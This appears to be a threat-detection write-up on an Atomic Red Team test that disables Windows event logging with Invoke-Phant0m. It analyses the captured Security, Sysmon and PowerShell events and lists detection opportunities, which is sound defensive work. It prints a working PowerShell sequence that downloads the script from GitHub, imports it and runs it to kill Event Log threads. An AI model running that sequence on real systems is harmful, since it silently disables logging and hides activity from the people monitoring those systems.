# T1562.002-3: Disable Windows Event Logging — Kill Event Log Service Threads (Invoke-Phant0m)

## Technique Context

T1562.002 (Disable Windows Event Logging) covers adversary actions to prevent or degrade Windows event log collection. This test uses Invoke-Phant0m, a publicly available PowerShell script that targets the Windows Event Log service (running within a shared `svchost.exe`) by enumerating its threads and killing the ones responsible for event processing. Unlike stopping the Event Log service — which is obvious, may require elevated privileges on modern Windows, and would generate system events — Phant0m leaves `svchost.exe` running while silently eliminating the threads that write events. After Phant0m executes, the Event Log service appears healthy but drops all incoming events. The script is fetched at runtime from GitHub rather than being pre-staged.

The full attack sequence:
```powershell
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
$url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"
$output = "$env:TEMP\Invoke-Phant0m.ps1"
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)
cd $env:TEMP
Import-Module .\Invoke-Phant0m.ps1
Invoke-Phant0m
```

## What This Dataset Contains

The dataset spans roughly five seconds and captures 110 events across PowerShell (104), Security (4), and Sysmon (2) channels.

**Security (EID 4688):** Four process creation events. PowerShell (parent) spawns `whoami.exe` (test framework identity check), then spawns a child `powershell.exe` with the full attack script embedded in its command-line field (visible in the EID 4688 record, including the GitHub URL for Invoke-Phant0m). The cleanup invocation appears as a separate `powershell.exe` creation:

```
"powershell.exe" & {Write-Host "NEED TO Restart-Computer TO ENSURE LOGGING RETURNS" -fore red
Remove-Item "$env:TEMP\Invoke-Phant0m.ps1" -ErrorAction Ignore}
```

This cleanup message — "NEED TO Restart-Computer TO ENSURE LOGGING RETURNS" — is a confirmation that Invoke-Phant0m executed and killed the Event Log threads. Restoring logging requires a reboot because the killed threads cannot be restarted without restarting the service or rebooting.

**Sysmon (EID 3):** Two network connection events, both from `MsMpEng.exe` (Windows Defender's engine process, PID 3556) connecting outbound to `48.211.71.194:443`. These are Defender cloud telemetry connections tagged with sysmon-modular rule `technique_id=T1036,technique_name=Masquerading` (because `MsMpEng.exe` is sometimes impersonated, so Sysmon flags its network connections for review). These are background Defender activity unrelated to Invoke-Phant0m.

Notably absent: no Sysmon EID 3 or EID 22 events for the Invoke-Phant0m download from `raw.githubusercontent.com`. The DNS resolution likely used a cached entry or the connection was established and released too quickly to be captured in the sysmon network connection filter.

**PowerShell (EID 4103 + 4104):** 104 events. One EID 4103 records `Set-ExecutionPolicy Bypass -Scope Process -Force` (test framework setup). EID 4104 events are almost entirely ART test framework boilerplate. The cleanup block `Invoke-AtomicTest T1562.002 -TestNumbers 3 -Cleanup -Confirm:$false` appears in 4104.

## What This Dataset Does Not Contain

**No Invoke-Phant0m script content in PowerShell logging.** This is the most important absence. Invoke-Phant0m uses `System.Net.WebClient.DownloadFile()` to retrieve the script, then `Import-Module` to load it. If AMSI were active, it would scan the downloaded content and potentially block it. With Defender disabled, there is no AMSI scan and no script block logging of the Phant0m payload itself — only the wrapper command that downloads and executes it. The actual Phant0m thread-killing code is not logged.

**No network connection events for the Phant0m download.** The GitHub download URL is visible in the Security EID 4688 command line, but no Sysmon EID 22 (DNS query) or EID 3 (network connection) appears for `raw.githubusercontent.com`. In the defended variant, Sysmon also failed to capture these — the connection appears to complete before the sysmon filter matches, or DNS used a cached result.

**No Sysmon EID 1 for the Invoke-Phant0m execution.** The sysmon-modular rules do not log PowerShell script content execution as a separate process create; the EID 1 would only appear for external processes spawned by Phant0m (none in this case, as it operates entirely in-process).

**No thread termination events.** Windows does not generate a security event when user-mode threads are terminated. The absence of Event ID 7036 (service stopped) or similar events in the System channel is consistent with Phant0m's design — it kills threads, not the service.

**Significantly fewer events than the defended variant.** The defended run produced 44 Sysmon + 18 Security + 39 PowerShell + 5 System + 3 Application + 1 WMI + 4 TaskScheduler events (114 total). The undefended run produced 104 PowerShell + 4 Security + 2 Sysmon events (110 total). The defended variant had richer cross-channel telemetry because the Sysmon instrumentation captured WinRM startup, system events, and registry changes that coincided with the test window. The undefended run is much sparser.

## Assessment

Invoke-Phant0m executed successfully. The cleanup message "NEED TO Restart-Computer TO ENSURE LOGGING RETURNS" in the Security 4688 cleanup command-line is the clearest indicator — this is a hard-coded string in the ART cleanup script that would only be printed after a successful Phant0m run. The download succeeded (the GitHub URL is visible in the process command line), the module was imported, and `Invoke-Phant0m` ran against the Event Log service threads.

Because Defender was disabled, there was no AMSI block on the Phant0m script, no behavioral detection of thread enumeration against svchost.exe, and no cloud-submitted sample to block future executions. In a defended environment, Defender behavioral protection would typically catch Invoke-Phant0m through its thread manipulation patterns.

This dataset is a good example of a technique where the attack itself erases its own evidence — after Phant0m runs, subsequent events would not be logged to the Security channel until a reboot restores Event Log threads.

## Detection Opportunities Present in This Data

- **Security EID 4688 (command line):** The full Invoke-Phant0m download URL (`https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/...`) is captured verbatim in the spawning PowerShell's command-line field, along with the `$wc.DownloadFile`, `Import-Module`, and `Invoke-Phant0m` calls.
- **Security EID 4688 (cleanup command):** The string "NEED TO Restart-Computer TO ENSURE LOGGING RETURNS" in any command line is a specific Invoke-Phant0m post-execution indicator.
- **Sysmon EID 3 (MsMpEng.exe):** While these connections are legitimate Defender telemetry, the absence of expected Defender activity (no MpCmdRun.exe, no block events) alongside a raw.githubusercontent.com download in the process command line is an anomaly worth investigating.
- **Process ancestry:** `powershell.exe` spawned by `powershell.exe` with a `WebClient.DownloadFile` call to a raw GitHub URL and an immediate `Import-Module` is a recognizable pattern for in-memory script execution.
